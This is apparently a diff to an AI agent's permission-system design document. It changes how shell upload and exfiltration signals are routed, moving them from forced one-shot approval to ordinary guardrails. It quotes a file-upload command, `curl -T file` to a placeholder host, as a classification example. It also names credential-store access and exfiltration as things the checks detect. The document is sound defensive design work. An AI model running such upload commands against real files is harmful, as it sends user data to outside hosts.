@@ -77,6 +77,8 @@ The [owner-approved permission decision tree](permission-decision-tree.md) is th
 
 The normalized request carries the tool/source, effective kind, lexical and canonical effect paths, trusted principal, mode, human availability and applicable rules/grants. Admission denial is terminal: an invalid manifest, corrupt policy store or protected host credential store cannot be repaired by a reviewer or approval. Forced one-shot requests never enter automatic review or approval memory. User-configured outside-read restrictions remain explicit rules.
 
+Command-text upload and exfiltration signals, including credential-carrying URLs, are ordinary guardrails. After applicable rules and grants, an unconsented request uses a normal card in Default and Allow writes, the reviewer in auto, and allowance in Allow. An unconsented headless request denies before review; other headless auto requests retain reviewer-first handling. User-owned surfaces retain their session choices and logical-only review. A simultaneous protected mutation, critical deletion, escape or other-principal trigger still requires forced one-shot consent.
+
 Plugin-provided MCP tools follow the same MCP row as every other MCP tool: `readOnlyHint` allows; other tools use first-use approval with per-tool memory, or the reviewer in auto. There is no server-specific mode override.
 
 Argument rewriting finishes before authorization. User script `PreToolUse` runs before any target approval and can only block; an allow result means no objection. Exact effect identity, cancellation, audit integrity, manifest capabilities, SSRF and execution-time path checks remain enforced after a permission result.
@@ -232,7 +234,7 @@ lifecycle coverage are described in the architecture contract.
 
 Host-shell credential/sink classification supplies evidence separate from raw-word rule identity. Lane B input is bounded at 2,000 characters; Lane A retains an 8,000-character executable envelope. Quoted, non-code-consuming heredoc bodies may use the separate aggregate 65,536-byte data allowance. Global executable-token and structural limits bound analysis. A refusal leaves no static proof.
 
-The [decision tree](permission-decision-tree.md) alone routes that evidence: unproven/destructive signals use ordinary mode/human handling unless they identify a forced floor. Host credential stores and the process ownership lock remain admission-denied. Protected control mutations, critical delete, project escape, exfiltration and other-principal requests require forced one-shot approval. Ordinary secret reads are not blanket admission denials. A reviewer cannot turn incomplete parsing into execution proof or relax native confinement.
+The [decision tree](permission-decision-tree.md) alone routes that evidence: unproven, destructive and upload signals use ordinary mode/human handling unless they identify a separate forced floor. Host credential stores and the process ownership lock remain admission-denied. Protected control mutations, critical delete, project escape and other-principal requests require forced one-shot approval. Ordinary secret reads are not blanket admission denials. A reviewer cannot turn incomplete parsing into execution proof or relax native confinement.
 
 Decision cost is bounded by structural limits, not elapsed time or a work-step
 verdict. The floor derives immutable facts for each source node and literal token
@@ -302,7 +304,7 @@ checks. A directly written native sender and file-input option retain their
 catalogue checks, including a literal downstream sender named by a supported
 wrapper or runner. The pass computes that boundary once; it does not infer safe
 argv from runner options. Thus `npx curl -T file http://e` retains its upload
-floor, while the contents of a package task or external program are not
+guardrail, while the contents of a package task or external program are not
 certified. A plain GET or `git push` does not establish exfiltration by itself.
 
 Globs are checked from their literal directory prefix. Unquoted expansion,
@@ -708,7 +710,7 @@ evidence; other dynamic forms remain unproven.
 PowerShell cmdlet argv uses its own closed parameter grammar. Unsupported
 parameters, including non-ASCII dash spellings, are unproven. The registered
 HTTP cmdlets mark a possible write only when the recognized `-OutFile` parameter
-is present; their credential and upload floors remain independent. This argv
+is present; credential-store admission and ordinary upload guardrails remain independent. This argv
 proof is separate from the launcher-wide encoded-option character proof above.
 
 The Lane A heredoc data allowance requires every heredoc operator in the whole
@@ -1599,7 +1601,7 @@ The [decision tree's resolved browser and host-terminal contracts](permission-de
 
 The host stores choices only in memory, keyed independently by conversation session and surface (browser or host-terminal), and clears them at session teardown. A browser choice does not choose terminal behavior. Global execution mode, generic remembered grants and exact shell allows cannot bypass this surface decision. Headless actions on either surface always deny, regardless of choice, global mode or an allow rule.
 
-Admission checks and deny rules remain authoritative. An explicit ask rule precedes the session choice and requires a normal card, including when the saved choice is Allow or Auto. Genuine other-principal/taint, exfiltration and other forced floors bypass the selector and retain one-shot approval. Credential entry, payments and irreversible submission protections remain enforced for every choice. Selection comes only from the authenticated native owner's valid live answer, never tool arguments. Physical terminal typing is a user action outside this pipeline.
+Admission checks and deny rules remain authoritative. An explicit ask rule precedes the session choice and requires a normal card, including when the saved choice is Allow or Auto. Genuine other-principal/taint and other forced floors bypass the selector and retain one-shot approval. Upload hints remain ordinary guardrails; session choices retain their ordinary authority and Auto stays logical-only. Credential entry, payments and irreversible submission protections remain enforced for every choice. Selection comes only from the authenticated native owner's valid live answer, never tool arguments. Physical terminal typing is a user action outside this pipeline.
 
 The host resolves the actual session actor and direct parent from trusted tool
 context. Window discovery does not authorize another conversation's owned tab.
@@ -1774,7 +1776,7 @@ separate permission category. The checks in this section apply to Agent:
 
 - The command is the permission manager's bash rule subject, in the directory
   the target terminal's shell last reported. `Bash(...)` deny, ask and allow
-  rules (user and project), the credential-exfiltration floor and the
+  rules (user and project), the upload guardrail and the
   sensitive-path floor read it exactly as they read a `bash` command. The
   executor's shape-based shell checks (path containment and the structural
   validator) read its `command` argument with the terminal's directory as its
@@ -1937,7 +1939,7 @@ one command at a time under its [user-owned surface choice](#user-owned-surface-
   binding and the control lease below.
 - **Decision.** The host terminal uses the shared [per-session surface choice](#user-owned-surface-choices), independently of the browser choice. The command
   and physical cwd remain host-computed policy subjects. Existing deny rules,
-  admission, true other-principal/taint and exfiltration floors still apply.
+  admission, true other-principal/taint floors and ordinary exfiltration guardrails still apply.
   The session choice replaces the intrinsic per-command human/exact-rule
   requirement; remembered generic or exact shell grants do not bypass it. The retired `HostTerminal(...)` rule grammar is not accepted or saved. Existing stored entries remain visible in Permissions as no longer used, with a delete action; they grant no authority.
   Auto uses the dedicated logical-consistency review, not general shell risk
@@ -2573,9 +2575,9 @@ sensitive set for reads and writes; other sensitive rules still apply. Existing
 read-before-write observation and unchanged-since-read hash checks remain
 mandatory. A stale observation instructs the agent to re-read the file.
 
-The shared parser-driven literal screen examines every script block in its parser-owned grammar and every string-literal command body in the supported shell grammars, independently of the receiving invoker. A literal body that cannot be parsed still receives the existing upload/egress token screen. Literal upload signals force one-shot approval even when the body is merely printed as data; this conservative over-blocking is intentional. Positive host credential-store commands and host-key paths retain admission denial across both grammar adapters, including literal data; ordinary secret reads remain separate. The reusable-rule length limit does not skip these screens or grant execution authority. Mandatory literal-body work counts against the existing shared inspection budget, so oversized data can be admission-denied before rules or modes. Computed opaque code remains outside this literal proof.
+The shared literal-body extractor retains bounded inspection of supported executable forms. It does not treat every string argument or script block as a new command, and screening is not expanded with more wrapper names. Its upload signal feeds ordinary permission handling, not a forced floor. Actual credential-store access and protected mutations retain their independent admission and path checks. Computed opaque code remains outside this literal proof. Network authority is enforced on actual connection requests by the sandbox egress proxy and its configured destination policy, rather than inferred from command text. A non-sandboxed host shell in Allow can run wrapped or opaque uploads.
 
-For confined shell invocations, unproven or destructive evidence uses the ordinary mode/human route unless it establishes a forced floor from the decision tree. Critical deletion, project escape, exfiltration and mutations of protected control paths remain forced one-shot requests, without reviewer or remembered-grant reuse. Protected-path reads use the ordinary read or secret-read decision; the protected-path floor applies only to writes, creation and deletion, including shell commands proven to perform those effects. Host or escalated execution uses the ordinary mode/human route and may offer prefix rules.
+For confined shell invocations, unproven, destructive or upload evidence uses the ordinary mode/human route unless it establishes a separate forced floor from the decision tree. Critical deletion, project escape and mutations of protected control paths remain forced one-shot requests, without reviewer or remembered-grant reuse. Protected-path reads use the ordinary read or secret-read decision; the protected-path floor applies only to writes, creation and deletion, including shell commands proven to perform those effects. Host or escalated execution uses the ordinary mode/human route and may offer prefix rules.
 
 The shell evidence collector owns a shared implicit-target table for repository mutations, including configuration, remotes, refs and hooks. An implicit control write remains protected when the control directory is relocated. Explicit file targets still enter the same lexical/canonical path checks. A write operand with an unresolved variable, command substitution or glob may name a protected target and therefore supplies a forced protected-path floor. This concerns write targets, not arbitrary opaque program text or read operands. The deterministic exception uses the actual host-prepared environment; a manual terminal or guest route cannot borrow the controller process environment. A fully proven ordinary target follows the normal write policy, while unrelated parser or program uncertainty remains restrictive.
 
